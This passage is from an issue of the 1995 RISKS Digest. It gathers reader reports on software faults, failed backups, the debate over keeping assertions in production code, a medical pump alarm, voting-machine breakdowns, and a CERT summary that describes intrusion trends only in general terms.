I realize, too, that this is a golden opportunity to sling mud at Sun and
those dratted register windows, but -- Sun ships very many boxes, and runs a
great diversity of code on those boxes.  It's a simple matter of programming
(no harder than the fault recovery that people are proposing here :-) to get
this right, and they were capable of this, as demonstrated by the SS10+4.1.3
combination. The customer mix was still relatively technical at the time I
left (i.e., someone who buys a PC to run games and word-processing is
unlikely to report THIS bug).  The internal bug-tracking software is
relatively easy to use, so people use it.  Bugs do get reported, they do get
recorded.  This one still slipped through. For what (rational) reason do you
think that any other platform would do better?  I've never had an
opportunity to give any of the other boxes as thorough a going over as I've
given to SunOS or Solaris over the years, so my failure to discover such a
bug in HPUX or AIX or IRIX or NT is not a ringing endorsement of their
stability.
<P>
( On the other hand, I am happy that my editor (emacs) doesn't fall
over and lose all my edits when faced with the occasional inability
to obtain resources.  As someone pointed out in reply, it is not
acceptable to simply throw up one's hands and walk away when
something that is always harmless and usually sensible could be done. )

Public resistance to electronic road-use taxes is continually to grow
worldwide.  Most recently, a panel of 14 laymen assembled by Teknologi
Naevnet (i.e., The Danish Board of Technology, Antonigade 4, DK-1106,
Denmark, +45 33 32 05 03 -- see report number 5/1995), having been presented
with arguments pro and con concerning "intelligent traffic" technologies,
concluded that it "does not see any substantial economic, environmental or
safety benefits from massive public investments in traffic informatics --
perhaps with the exception of public transport".  On the issue of safety,
for example, they accepted that some likely safety benefits existed, but
that they had to be weighed against other potential dangers, for example
that drivers' skills may deteriorate due to reliance on automation, and in
any event they concluded that if safety should be improved then much more
cost-effective measures were available anyway.  They also raised concerns
about privacy and emphasized that new legislation would have to regulate the
new databases that such systems would accumulate.
<P>
The report fits an emerging global pattern.  When electronic road tolls and
other forms of high technology that entail surveillance of citizens'
movements are implemented quietly, creating a fait accompli, citizens tend
to accept them fatalistically.  But when any sort of democratic procedure is
employed, public resistance is very stiff indeed.  This phenomenon suggests
two possible scenarios for the future:
<OL>
<LI>Continued stealth implementation, leading to deepening public distrust
of information technology and the organizations that control it.
<P>
<LI> Genuine public involvement in the social choices being made about
"intelligent" roadway technologies, leading to legitimate decisions
based on full public debate, and potentially as well to technological
improvements (such as the use of digital cash and other technologies
of anonymity) that deliver a broad range of functionality while
responding appropriately to legitimate public concerns.
</OL>
Which scenario occurs will depend on the political culture of each country.
More concretely, it will depend on the degree to which people are informed
about the issues, express their concerns, and ensure that the more legitimate
course is taken.

I was talking to a friend yesterday about the fear of losing our computers
and did we have adequate backups for the work we did at home.  As a result,
she recounted the following cautionary tale. Although it was from a number
of years ago (as the technology will show), the lessons remain relevant.
<P>
She was responsible for a major health research project, which involved the
collection of a large quantity of survey data.
<P>
The data was coded onto punched cards.
<P>
The punched cards were read into the computer.
<P>
Two tape backups were kept one locally and one at a secure distant location.
<P>
Adequate precautions one would think - the same data existed in five
different forms. However:
<OL>
<LI>The computer crashed eliminating the current file.
<P>
<LI>Someone had written over the first part of the local tape - making the
tape unusable.
<P>
<LI>When the computer centre was contacted they said that a boiler explosion
had destroyed many of the tapes in the storage area and the records of who
they belonged to. They were waiting for client to contact them so they could
identify the scope of the damage. The backup my friend was seeking was one
of those destroyed.
<P>
<LI>They went back to the punched cards. This meant losing the analysis of
the data, but this could be redone if the original data was available,
<P>
BUT
<P>
Someone had dropped the cards on the floor. There were several thousand of
them and they could only be entered in the right order. There were now in
random order. There was a faint dot matrix printed number on each card.
<P>
<LI>The project team were faced with three options:
<P>
a. sorting the cards<BR>
b. re-punching all the data<BR>
c. abandoning the project

They chose c.

The *New Zealand Herald* of 27 Nov 1995 carried an article which described
who a five-year-old boy had been trapped in a closed bank for 30 minutes
after somehow managing to get the doors open. The doors then closed behind
him, trapping him in the entrance-way between two sets of double doors.
<P>
The Police and Fire Service were called and tried unsuccessfully to free
him, but he remained trapped until one of the branch managers arrived "with
a card which opened the doors electronically. The Manager told Police it was
not the first time the front doors of the bank had caused problems."

I had occasion to store some luggage in a locker at Edinburgh railway
station last weekend. They have a computer-controlled system. The idea is
that you place your luggage in a locker, and close the door, which then
locks. You then go to a control panel with an LCD display, and enter the
required money. The panel gives you a printout with the code which you
later enter to unlock the locker.
<P>
There is a safety feature, in that if you don't enter the required money
within 30 seconds, the locker unlocks again. Green and red lights show the
state of the door lock, not to mention the fairly noticeable clunk of the
lock mechanism.
<P>
The problem is that there is one control panel shared among several lockers.
When you close a locker, it appears to "grab" the control panel.  However,
you can still close other lockers, which presumably wait their turn for the
control panel.
<P>
As far as I can work out, while placed a lot of luggage in on locker, I
closed one of the other doors, by accident (such as leaning a case against
it), with the result that I paid for a couple of hours security of an empty
locker, while the locker with my luggage unlocked after I had left it.
Thankfully, nothing was stolen (perhaps nothing was worth stealing.:-)).
<P>
I returned to the locker shortly before my train was due to leave, so didn't
have much time to experiment with the system before I had to catch the
train. However, there was nothing which drew my attention to the fact that I
might be paying to lock the wrong door.  This might happen more than you
would suppose - someone else was feeding stuff into a locker just after me.
It's not too hard to foresee a race condition where someone pays to lock
your luggage in, and then walks off with the unlocking code.

<I>Wed, 22 Nov 95 12:16:04 EST</I>
<P>
[This message is a resubmission of comments I originally made regarding an
item in RISKS 17.16.  While the context is different, I feel they are
apropos, since people are debating the safety of removing runtime assertions
that check for programming errors.]
<P>
In RISKS DIGEST 17.16, Andy Huber &lt;<A HREF="mailto:arhuber@SEI.CMU.EDU">arhuber@SEI.CMU.EDU</A>&gt; says "One of the
conclusions is that many buildings fail due to a lack of redundancy, which I
find very interesting since very few operating systems (or software of any
kind) has any kind of redundancy designed or built into it.]"
<P>
On the contrary, I do see quite a bit of software with redundancy built in
(but not nearly enough). We often think of redundant systems as meaning
side-by-side system/subsystem duplication, but a practice that should be
more widely promoted is that of "sanity checking", where redundant (i.e.,
apparently unnecessary) code is introduced to check information generated by
another part of the software. The idea is that one part of the system checks
up on the other part, to determine if the other part has "gone insane".
<P>
For example, a routine may compute a value intended to be in a certain
range, then pass it to another routine that first verifies the value is in
range before actually trying to use it. Especially when this is all within a
single subsystem, one could argue that checking the value is unnecessary,
since it was just generated by a routine known to be generating correct
data; thus compute cycles and memory (for the additional instructions) are
being wasted. This argument is generally the one used to skip sanity
checking (assuming anyone bothers to consider it in the first place).
However, the further apart the producer and consumer of the value are, the
greater the opportunity for something to corrupt it.
<P>
Besides, what happens when someone makes an incorrect "enhancement" to the
producing routine, so that now it does produce bad data? Or what if the
consuming code is reused on another project, called from different code than
that for which it was originally written? Or what if the stack gets
corrupted due to a bad interrupt service routine? Or there is a read error
pulling the value in from the database on the disk? Or... ad infinitum until
you can be convinced that it is worthwhile to do a little more rigorous
checking of data before using it.
<P>
The point of all this is to detect data corruption or faulty code and try
and do something about it before the situation gets worse. For instance,
some operating systems incorporates sanity checks on internal data
structures, and generally respond to detected faults by crashing the system
with a "bugcheck", the logic being that once a problem is detected, the
system should be shutdown before the problem propagates further and possibly
corrupts user data. So while users might complain about the system going
down, bugchecks are their friends.
<P>
The difference between software and buildings is that a building can not
take itself down and bring itself back up to correct its problems. The same
may be said of critical realtime control software, since an aircraft on
final approach is not a good time for the flight control system to reboot
itself. So in reality, detecting a problem is the easy part; it's dealing
with the problem with the least undesirable consequences that is the hard
part!

<P>
Roger Wolff and others recommend leaving checks for programming errors in
production code to ensure the consistency of internal data representations,
but also to ``catch lots of errors earlier on''.
<P>
This has the `disadvantage' of clearly identifying problems in the
code, which:
<P>
(a) the users are more likely to report, and<BR>
(b) the users are going to want fixed.
<P>
The cost of telephone support would increase, as would the workload of
the programming departments.
<P>
``There are no bugs in Microsoft products that the majority of users
want fixed''
<P>
Make sure that the majority of users don't know about the bugs (the
``luddites'' will probably blame themselves for ``not using the
software properly''), and the above marketing statement will stand.
<P>
The risks?  `Luddites' expecting higher quality software.

<P>
I seem to have read a different "Writing Solid Code" than the other posters
to this list. The version I read supported the following coding style:
<P>
Add two blocks of checks to significant pieces of your algorithm:
<P>
&lt;1&gt; ASSERT<BR>
&lt;2&gt; fixup<BR>
algorithm
<P>
The ASSERT checks are designed for use in a run-time environment where all
the source code is available. If an ASSERT check fails, it does so showing
the user the line in the source where a precondition violation has been
detected. It is intented for programmers who are clients of an interface,
and its goal is to get programmers to call the interface correctly.
("Writing Solid Code" also recommends that the ASSERT re-compute the return
value by another, slower algorithm, and compare the two values. Surely such
checks can be removed in the production version.)
<P>
The "fixup" checks often check the exact same preconditions that the ASSERT
checks check. These checks are intended to be executed in all environments,
but since they check the same things as the ASSERTs, they generally don't
fire in the development environment, since the ASSERT will already have
fired.  The "fixup" checks job is to handle the error in a way appropriate
for a production environment. Often this means throwing an exception, which
cleanly backs out of a partially completed operation, and displays an error
message to the user explaining in the users terminology what went wrong.
<P>
Sometimes it just means fixing up the precondition and continuing. For
example, if you pass a bad pointer for one of three output arguments, should
the program die or should it compute the two outputs it can, and not touch
the third? The "Writing Solid Code" answer to this question is: The program
should die during development so that the developer will discover and fix
the problem. The program should continue after deployment, because immediate
termination is less useful to the customer.
<P>
If you want to bash Microsoft, just quote the section of "Writing Solid
Code" where the author says he wrote the book because he had observed
a decline in code quality inside Microsoft, that the lessons of the past
that his book was supposed to teach were being ignored within Microsoft.

<P>
&gt; This is much like the old Burroughs boxes, where the compiler guaranteed<BR>
&gt; that no operation that violated the security policy was generated.
<P>
Presumably Peter is speaking of the Burroughs B-6700 -- and its modern
descendent, the Unisys A-Series, which has all the same attributes. In fact,
the A-Series is still virtually code-compatible with the defunct B-6700.
<P>
To say the compiler guaranteed that no operation violated security is a
vast oversimplification. Security, in the broad sense, is a joint
responsibility of the compilers, the instruction set architecture (ISA), and
the operating system (MCP). The compilers do not generate code which
unconditionally violates security, but often the generated code is further
checked by the ISA or the MCP. For example, the ISA checks array bounds and
prevents the code from accessing memory outside that allocated to the task.
The MCP manages file access security. And so on. This division of
responsibilities is a sound method, as evidenced by the high security level
and reliability of A-Series systems. Doing all the checks at run time is not
necessary.
<P>
The A-Series actively supports the paradigm that all assertion checks should
remain in the code. The most obvious such support is the ISA checking for
array bounds, as it can do so in parallel with the actual memory addressing
operations at no cost in performance and a very small cost in the price of
the CPU. Numerous similar examples exist in the architecture.

<P>
&gt;There are probably a few assertions which belong only in development code,<BR>
&gt;because they are so expensive to check that they make the product unusable.<BR>
&gt;In my experience, this is surely *not* the common case.
<P>
I'm not sure if this experience is that wide-spread.  In my own experience,
there are a great many assertions which are unacceptably expensive to check.
Here are a few examples:
<P>
Heap/Pointer Integrity:  Many (most?) programmers use pointer checking
techniques to catch dangling pointer uses and memory leaks.  This typically
involves using a special tool (e.g. purify) if you're lucky enough to run
on a platform that supports it, or using a special malloc library along
with routines called by the user at appropriate points (e.g. CheckPtr,
CheckRefWithinRange, etc.)  Most of these schemes cause programs to run
3 to 10 times slower than without the checks.  That's generally not
acceptable in a production application, so such checks are omitted from the
final version.  I would estimate that at least 50% of the assertions I
put in my code are calls to such utilities.
<P>
Algorithmic Redundancy:  It is common to run multiple independent algorithms
in a debug version and compare their results.  For instance, in the
Microsoft book, they say the debugging spreadsheet engine uses 2 algorithms
to recompute values.  One is the fancy dataflow based one which only
recomputes stuff that depends on changed values.  The other recomputes
everything.  Then the results are compared.  If they are different, then
there is a bug somewhere.  This approach is useful anytime one uses a very
complex algorithm to try to improve performance.  Applications which use
many such algorithms (spreadsheets, databases, and compilers, perhaps?)
may have a significant amount of code devoted to these checks.  Since the
verification algorithm is usually much slower, you wouldn't want to include
it in the production version.
<P>
Structural Checks:  In programs that use complex internal data structures
(like compilers), it is common to write routines which verify the integrity
of the structure.  Such routines are usually expensive since they traverse
the entire structure.  I certainly have a tendency to call these checks
anytime I modify the data structure in some way.  This usually results in
serious slowdowns, so they can't be included in the final version.
<P>
Simple checks such as array bounds, NULL pointer, and unexpected switch/enum
value checks can also be very expensive.  I tend not to be that great a
programmer, so my code is really peppered with these checks.  (Some modules
have more than 50% of the lines devoted to this stuff.)  Even after turning
off the fancy memory and algorithm checks, these alone may cause slowdowns
of 2 or 3, and sometimes serious as 5 times (always in the compute-intensive
sections of the code, too, wouldn't ya know it!).  You might want to keep
some checks in the final version, but you may have to turn off a significant
number of them.
<P>
The main reason for this approach to programming is the reality that
programmers don't like to put stuff in the code that makes it run slower.
If you can convince a programmer that "your checks will not be in the
final version", then he'll be much more willing to put assertions into the
code.  By having so many more assertions, you can catch many bugs much more
quickly than by putting in only as many assertions as you can get away with
given the program performance you are targeting.  By catching more problems,
you may be able to produce a program that has fewer bugs by the time it
reaches the user.  Although bugs that do slip through might be harder to
detect, and perhaps more damaging, the tradeoff may still favor turning off
many of the assertions.
<P>
I'd like to suggest a different reason why Microsoft's products may not be
very good.  It's because of their complexity.  The approach advocated in the
book is based on the idea that bugs will be caught during the beta-test stage.
In many situations, this is reasonable (and many solid programs have been
written using the above approach; it's not just Microsoft's idea, although
they published the book).  However, I suspect that Microsoft's applications
are becoming so complex that it is no longer possible to thoroughly test the
programs, so bugs start slipping through.  Perhaps a redesign of Microsoft's
design philosophy is what's required.
<P>
Perhaps the best solution is to give 2 versions of the program to the end user.
One with debugging, to satisfy people who are paranoid about losing all their
data due to internal program corruption.  The other without any debugging, for
situations where you need maximum performance.  Then let the user decide which
to use.
<P>
&gt;(no, I haven't reported these to Microsoft. Why should I? They're not going<BR>
&gt;to fix it... we're going to have to upgrade to 3.51 just to get around this<BR>
&gt;bug, for all that Bill Gates claimed "A bug fix is the worst possible reason<BR>
&gt;to release an upgrade" or words to that effect).
<P>
The bugs will be in the code regardless of whether or not you remove the
assertions (excepting the tradeoff I mentioned above).  Whether or not the
company is willing to release bug fixes for the bugs (however detected) is an
entirely different matter -- a marketing matter.  I'd say the programmers are
well aware of the reported bugs, and probably have versions of the code
with the bugs fixed.  It's management's decision not to provide these fixes
to the end user, for whatever reason (saving money, etc).

A cute article by Joan E. Rigdon in the *San Francisco Sunday Examiner and
Chronicle* Computers &amp; Technology section (``How do you spell dated?  MS
Word hasn't brought dictionary into cyber-age'' -- 26 Nov 1995, B-5) points
out that the Word spellchecker makes the following suggestions for words
that putatively would seem important to Microsoft:
<P>
Internet      --&gt; interment<BR>
Internet's    --&gt; internee's<BR>
e-mail        --&gt; emboli (blood clots)<BR>
cybershoppers --&gt; [no suggestions]<BR>
Netscape      --&gt; [no suggestions, although pretending that your
competitors don't exist is a nasty strategy.
<P>
Ms. Rigdon also notes that Microsoft should have received adequate warning
last December when the *Dallas Morning News* ran a garbled story resulting
from an editor accidentally accepting all of the alternative spellings,
including the following conversions:
<P>
Intel         --&gt; Until<BR>
Microsoft     --&gt; Microvolts
<P>
As noted in RISKS on numerous occasions, our archives are full of such
transgressions (most recently, see <A HREF="/Risks/17.32.html">RISKS-17.32</A>).  [Transgreshams Law,
I suppose.]  Similar to MS ignoring Netscape was Scott Siege's item in
<A HREF="/Risks/15.72.html">RISKS-15.72</A> that the Apple MacIntosh spellchecker suggested changing
"Laserwriter" to "Laserjet" (not surprisingly, an Apple product).

The Oakland airport radar failed again on 29 Nov 1995 for about two hours,
beginning at 9:44am.  ("The cause ... was not known.")  Backup radar at
Moffett Field was used; however, it covers a smaller area, and delays were
incurred on 17 takeoffs at SFO.  There had also been a brief failure on 28
Nov 1995, but it caused no disruption.  Usual statements were made about how
safety was not impaired and no one should be concerned.  FAA spokesman Mitch
Barker said, "We don't let it operate if it's not safe."  He was also quoted
in a made-for-RISKS statement: "Things are going to go wrong from time to
time, especially with a system as complicated as this."

[Source: *San Francisco Chronicle*, 30 Nov 1995, A13.  For further<BR>

required the backup system to be used for two days, but was not reported in
RISKS at the time.  Other ATC problems are also noted in recent RISKS -- in
Chicago (17.35) and Las Vegas (17.41).  The system may be safe, but it does
not seem sound.]

According to a front-page story by James W. Roberts in the 29 Nov 1995
_Asbury Park Press_ (NJ), a student at Monmouth University has been charged<BR>
with disrupting the school's electronic mail system for five hours by
bombarding two adminstrators with 24,000 e-mail messages.  The student's
computer access had been terminated on 9 Nov 1995 because of posting
advertising and business venture solicitations to "inappropriate sections of
the Internet" (presumably, Usenet groups).
<P>
It took 44 hours to trace the source of the attack through a service
provider in Atlanta, GA and back to an account based in Red Bank, NJ, shared
by the student.  The student is being charge with a federal crime because of
using interstate communication to deny service.  Carl Stern of the Justice
Department is said to have remarked that this is the first time the federal
computer fraud act has been used for an act of this type.

Ray Panko's story of being outsmarted by Excel trying to be clever in
dealing with percentages reminded me of my recent struggles with WordPerfect
6.1.
<P>
I recently started using WordPerfect 6.1, upgrading from 5.2.  It
has some nice features, but several strange things happened:
<UL>
<LI>I couldn't leave two spaces between a chapter number and the chapter name:
I would type two spaces but one would mysteriously disappear
<P>
<LI>typing (c) in a list (as in (a), (b), (c)), resulted in the copyright
symbol appearing.  There was no warning - in fact a document converted from
WP5.2 had to be recalled and reprinted when we noticed this change.
<P>
<LI>I could not select part of a word with the mouse: only all of it or none
of it.
</UL>
After a lot of aggravation, and buying a couple of books, I found that the
strange behaviour resulted from "enhancements" in WP6.1.  I've now disabled
the enhancements, so the software will do what _I_ want.

<P>
I recently underwent total hip replacement surgery.  As part of the
procedure, for pain control, the doctors fitted me with an intravenous
infusion system that gave me a continuous morphine feed in fluids at a
constant rate.  The system used two intravenous infusion (IV) pumps, one to
feed the morphine into the carrier fluids (a potassium salt solution, I
think), and the other to feed the carrier fluids into me.  Both pumps were
capable of operation from AC line or from internal rechargeable batteries;
this allows the patient to be transferred from the surgical suite to the
various other wards of the hospital without worrying about extension cords
on the way.  The pumps have an audible alarm, and there are several
illuminated icons on the front panel to indicate the reason for the alarm.
<P>
Morphine is a controlled narcotic, and IV pumps for morphine have a number
of special features.  The morphine is carried in a large syringe that is
mounted inside the pump, behind a locking panel cover.  The programming
controls for the pump are behind the locking panel as well; the pump cannot
be set up or reset without the key.  There is a patient-operated demand
switch, with an associated programmable lockout time, that allows the
patient to get an extra boost on demand, but no more often than the certain
interval.  The patient is expected to use the switch if he anticipates a
need for more pain control than the baseline; this happens for example when
the patient is transferred between beds, or when the physical therapists
enter the room.  (The physical therapists do a very necessary job that is
unfortunately not a whole lot of fun for the patient.)  Additionally, the
physician will generally allow the patient to request an additional booster
dose from the nurse, at longer intervals.
<P>
Because of other medical concerns, I spent the first 24 hours or so post-op
in intensive care, rather than going immediately to the orthopedic floor.
When we transferred me up to orthopedic, the ICU nurses rearranged everything,
loaded the pumps onto a conventional IV tree, switched them over to battery
operation, and we were on our way.
<P>
Transferring a patient from an ICU bed/gurney to a standard hospital bed is
something of a production, requiring several nurses to lift and a patient
not to scream.  Then all the various hoses coming out of the patient have to
be arranged, the IV pumps situated, power cords plugged in, and etc. etc.
<P>
About an hour after the transfer to orthopedic was completed, one of the
IV pumps alarmed.  I called the nurse's station and told them "alarm on the
IV pump".  I couldn't see the pump face to see which alarm indicator was on.
A nurse, not the one assigned to me, came in, said, "Oh, that is just the
battery alarm; you don't have to listen to that; I'll silence it."  She did
something on the front panel of the morphine pump, and the alarm stopped.
I asked whether the pumps were in fact plugged in; she glanced at the
power cords and said they were.
<P>
A few minutes later, the assigned nurse came in, just as I was starting to
notice discomfort building up.  She asked about the alarm; I explained; she
checked the morphine pump, and discovered that it had just shut down from
battery exhaustion.  She had to go get the patient chart and the safety key
and reprogram the pump, after plugging it into the wall.
<P>
The risks in the above design should be evident.  1) There should be an
unequivocal indication, continuously present, that the pump is running on
batteries.  2) There should be no operator procedure, other than getting the
pump running on AC line power, or shutting it off completely, to silence a
low-battery alarm.  3) Personnel have to be trained to think about WHY a
particular alarm is sounding, and the implications of the alarm, BEFORE they
reach for a "Silence" key.

<ADDRESS>
Pete Mellor
&lt;<A HREF="mailto:pm@csr.city.ac.uk">pm@csr.city.ac.uk</A>&gt;
</ADDRESS>
<I>Wed, 29 Nov 95 20:56:34 GMT</I>
<P>
The story from &lt;<A HREF="mailto:M.Cushman@lse.ac.uk">M.Cushman@lse.ac.uk</A>&gt; about multiple failures of back-ups in
<A HREF="/Risks/17.48.html">RISKS-17.48</A> reminded me of a somewhat similar incident which I perpetrated
many years ago while working in the Service Programming Department at ICL in
Stevenage.
<P>
The main programming effort was concentrated in the Executive Programming
Department. (The basic operating system on the ICL 1900 series was referred
to as an "executive". There was a more powerful operating system known as
GEORGE 3, but this ran on the larger machines in the range. Stevenage was
responsible for medium range machines which ran executives. I still think
that if ICL had played its cards right, GEORGE 3 could now have been a
serious rival to UNIX, but that is a separate story! :-)
<P>
Anyway, one task of Service Programming (as well as writing and maintaining
editors, assemblers and various utility programs) was to keep back-ups of
the source programs. The "executive masters", which were sources from which
a compiled executive for any hardware configuration could be derived, were
big beasts. The back-up involved running a disk-to-tape copy program, using
a grandparent-parent-child cycle of three pairs of tapes. If a pair of tapes
became full, the administrator (me) had literally to go from desk to desk
and persuade people to delete their out-of-date sources to make room for the
latest ones.
<P>
My job included reading the printed operator's log every morning to check
that the previous overnight back-up run was OK, and in particular that it
had not overflowed the two tapes. Came the day when I had neglected to do
this check for a while, and discovered that three nights previously, the
back-up had overflowed. All three generations of back-up MT had been
overwritten with a truncated copy!
<P>
Worse, the stuff that had dropped off the end included executive masters
that had not been changed for years. (They were still very live, however,
just not under active development.) The on-line medium was exchangeable disk
store (EDS). In those days, the largest EDS pack held 8 megabytes, and the
department had three drives. Only active sources were kept on-line. The
<EM>only</EM> copies of the masters I had lost resided on those back-up tapes.
Ouch!
<P>
I confessed. The most polite and least personal comment was from the
programming manager: "Oh my God! What are we going to do?"
<P>
<EM>Fortunately</EM>, on the day after the overflow, some of my colleagues had
deleted several large files. The result was that Monday night's back-up (for
the sake of illustration) had resulted in tape overflow and a truncated copy
of the back-up. On Tuesday night and Wednesday night, the actual size of the
entire back-up had been reduced, so that the second tape of the pair was
nowhere near full. (The back-up procedure was driven by a set of parameter
cards which specified which files were to be added and which deleted. The
back-up program worked by first copying any new files from disk, then
copying the child tapes to the grandparent tapes (overwriting them in the
process) omitting files which were declared as "deleted" by its parameters.)
<P>
Eureka! The "lost" data might still be there on the end of the second of one
of the pairs of tapes. So I took a program which would do a hardware
block-by-block read of a magnetic tape, patched into it a modification (in
1900 object code) so that instead of stopping at the "end of tape" (EOT)
mark, it halted with a suitable display and could then be restarted to copy
what lay beyond EOT, and so copied the tail-end of one of the less than full
back-ups.
<P>
Sure enough, there were all the files I had "lost"! My annual salary
increment began to look healthier!
<P>
For some reason, when I told my colleagues how I had saved the day, they
were less than impressed by my ingenuity, and unfortunately their responses
were couched in language which cannot be repeated in a polite forum such as
RISKS! :-)

&gt;&gt; As an aircraft mechanic who once witnessed a returning aircraft<BR>
run out of fuel on the taxiway with 5,000 pounds of fuel showing
on the gauges, I tend to disagree.
<P>
This triggers an old memory: In April 1971, my then boss bought a new
Pontiac Bonneville wagon.  He thought he was getting GREAT gas mileage.  He
was driving all over Northern Virginia and the gauge hadn't moved since
leaving the dealership.  The gauge was still registering 3/4ths of a tank
when the car ran out gas.  What had happened was that the float arm had been
spot welded (accidentally? bored autoworker?) in place.

<P>
I differ from the current practice of grouping online activity, information
theft, and component theft into "high tech" crimes.  While I feel strongly
that most malintentioned online activity is covered as an instantiation of
existing law and practice, it is a different kind of activity from stealing
chips.  In my mind, hijacking a truckload of RAM chips is just like
hijacking a truckload of flavorings destined for a food plant, or grabbing a
package out of the hands of someone just leaving a jewelry store: simple
theft of valuable material with low traceability.  True "Internet crime"
might be using a hole in security to gather information about another
system; and that's no different in intent from using an insecurely-locked
door to breach the physical security of the building to get at the same
system.
<P>
Reductio ad absurdum:  If someone breaks into my house and steals my
silverware, that's low tech crime;  if they steal my computer, it's
high-tech crime; and if they take the stereo, it's medium-tech crime.
<P>
We should educate the press and public on this matter, before we find
carjacking considered a "high-tech" crime because of the engine
computers.

Corporate America is emerging from a lengthy state of denial, and beginning
to take measures to protect its electronic assets.  Nearly half of the
respondents to an Information Week/Ernst &amp; Young poll reported having lost
valuable information during the past two years, with at least 20 saying
they'd lost information worth more than $1 million.  Nearly 70% said
security risks had worsened in the last five years, and nearly 80% now have
a full-time information security director.  As one analyst noted, "As
organizational structures are flattened, corporate reliance on the
availability and integrity of information systems is becoming painfully
obvious."  (*Information Week*, 27 Nov 1995, p32)

CERT Summary CS-95:03, November 28, 1995
<P>
The CERT Coordination Center periodically issues the CERT Summary to draw
attention to the types of attacks currently being reported to our incident
response staff. The summary includes pointers to sources of information for
dealing with the problems. We also list new or updated files that are
available for anonymous FTP from <A HREF="ftp://info.cert.org">ftp://info.cert.org</A>

<P>
RECENT ACTIVITY
<P>
Since the September CERT Summary, we have seen these continuing trends in
incidents reported to us. The majority of reported incidents fit into four
categories:
<OL>
<LI>Packet Sniffers
<P>
We continue to see daily incident reports about intruders who have installed
sniffers on compromised systems. These sniffers, used to collect account names
and passwords, are frequently installed with a kit that includes Trojan horse
binaries. The Trojan horse binaries hide the sniffer activity on the systems
on which they are installed.
<P>
For further information and methods for detecting packet sniffers and Trojan
horses, see the following files:

<P>
<LI>Exploitation of SGI lp Vulnerability
<P>
The vulnerability described in CERT advisory, CA:95:15 "SGI lp Vulnerability"
continues to be exploited, though we have seen a decline in the number of
reports since the advisory was released on November 8. Intruders gain
unauthorized access to Silicon Graphics, Inc. (SGI) IRIX systems through a
passwordless lp account; they use this initial access to leverage additional
privileges on the compromised system.
<P>
As distributed by SGI, the lp account (as well as other accounts), has no
password on a newly installed system. This fact is addressed in the
documentation that SGI distributes with their systems: "IRIX Advanced Site
and Server Administrative Guide" (see the chapter on System Security).
More information on this vulnerability and how it can be addressed can be
obtained from

<P>
<LI>Network Scanning
<P>
We continue to receive several reports each week of intruders using the
Internet Security Scanner (ISS) to scan both individual hosts and large IP
address ranges. The ISS tool, which is described in CERT advisory CA-93:14
"Internet Security Scanner", interrogates all computers within a specified
IP address range, determining the security posture of each with respect to
several common system vulnerabilities. Intruders use the information
gathered from such scans to gain unauthorized access to the scanned sites.
<P>
As part of a defensive strategy, you may want to consider running ISS against
your own site (in accordance with your organization's policies and procedures)
to identify any possible system weaknesses or vulnerabilities, taking steps to
implement security fixes that may be necessary. ISS is available from

<P>
<LI>Sendmail Attacks
<P>
New reports of intruders attacking sites through sendmail vulnerabilities are
continuing to arrive daily, although most reports indicate the attacks have
failed. The types of attacks are varied, but most are aimed at gaining
privileged access to the victim machine.
<P>
We encourage sites to combat these threats by taking the appropriate steps,
described in the following documents:

software engineering.  We invite submissions of system demonstrations
showing the improved effectiveness of software developed on a mathematical
basis.
<P>
The topics of interest include, but not limited to, the following:
SOFTWARE DEVELOPMENT ENVIRONMENTS<BR>
SUPPORT FOR CORRECT  SOFTWARE DEVELOPMENT<BR>
SYSTEM SUPPORT FOR REUSE<BR>
TOOLS FOR PROTOTYPING, VALIDATION AND VERIFICATION<BR>
THEOREM PROVING SYSTEMS
<P>
We invite prospective authors to submit 6 copies of system demo proposals (4
double spaced pages maximum) in an area relevant to the conference theme.
Papers should provide adequate information for the reviewers to assess the
significance and anticipated impact of the system on software technology.
All submissions must be sent to the program chair at the address below; the
proposals must be received by January 15, 1996 (new extended deadline).

Leonard X. Finegold of the Physics Department at Drexel University sent me
issues of the West section of the Philadelphia Inquirer for the two
Thursdays (9 and 16 Nov 1995, p.W1 in each case) immediately following the
November 1995 election day.  I have distilled two long articles.
<P>
Pennsylvania's Montgomery County spent $3.8 million on new MicroVote voting
machines, and attempted to use them in a very-low-turnout off-year election
on 7 Nov 1995.  Unfortunately, things did not go as planned.  There were
massive voting-machine breakdowns, 150 service calls, long delays in
repairs, and phantom vote tallies (for example, 22,000 write-ins were
recorded for prothonotary).  There were some three-hour waiting lines to
vote, and many people left without voting.  Incomplete results were wildly
erroneous, suggesting the wrong candidate was winning.  Although test runs
had been successful, something about the county's cross-filed candidates
seems to have caused the software to fail unanticipatedly.  By 4am, the
apparently bogus write-in votes had vanished altogether.  When the smoke
finally cleared, the official results were apparently satisfactory -- and
unchallenged.  It was also a major gremlin-style event: printers, copiers,
elevators, even radios used by the repair crews failed.  (The MicroVote
system reportedly has been used successfully in counties in Kansas, North
Carolina, and Indiana.)

An article in the 1 Dec 1995 *Wall Street Journal* (pg A14) should serve as
a stark reminder why people should make sure to overwrite their disks when
they delete files.  Jean Lewis is someone from the government who has made
some noise about something illegal connected with the Clinton
administration. (Details are too confusing for this short venue.) She's
apparently a Republican star witness. The Democrats apparently were given a
computer disk with important files on them. Unbeknownst to Ms. Lewis and the
Republicans, the disk also contained the text of a letter she wrote a friend
about her stepson. In the letter she compares him to Bill Clinton, whom she
calls a "lying bastard" for denying he slept with Gennifer Flowers.
<P>
The article says that Lewis had deleted the file long before she handed over
the disk containing other files to the Democrats.  Richard Ben-Veniste, a
lawyer for the Democrats, pulled out a copy of the letter during the hearing
and quoted the "lying bastard" phrase as proof that she was only on a
political vendetta when she uncovered her charges. Here's the article's
quote of Ben-Veniste:
<P>
Apparently you didn't think it was on the disk but it was.
That's the funny thing about these disks.  I don't understand how
they do it, but they can find the stuff on the disk that nobody thinks
is there.  I hate it when that happens, but here it is, Ms. Lewis.
<P>
What a town! They spend their waking hours trying to find out what other
people think of them. Then they get upset when it's not good. The moral:
investigate disk erasure programs that overwrite the disk a sufficient
number of times.

<P>
I wanted to record a small risk here for posterity.  My workstation
contains a Pentium chip.  Since this chip generates so much heat, the
motherboard design incorporates a small (1W) cooling fan which sits
immediately atop the chip heat-sink.  This is in addition to the usual
power-supply cooling fan contained in most workstations.
<P>
Sometime in the last month or two, this small chip-cooling fan died.  The
only reason that this might be of wider interest is the symptoms this caused
in the computer.  What happened is that, over a period of weeks, the machine
became "flaky".  Early symptoms were occasional difficulty logging in or
launching applications.  Later on, I experienced strange events such as
compiler error messages complaining of non-existent instructions.  These
would go away if I attempted the compilation again.  Towards the end,
cutting and pasting between windows became unreliable (what was pasted would
differ in a few characters from what was cut).
<P>
For a long time, the machine was basically usable despite these integrity
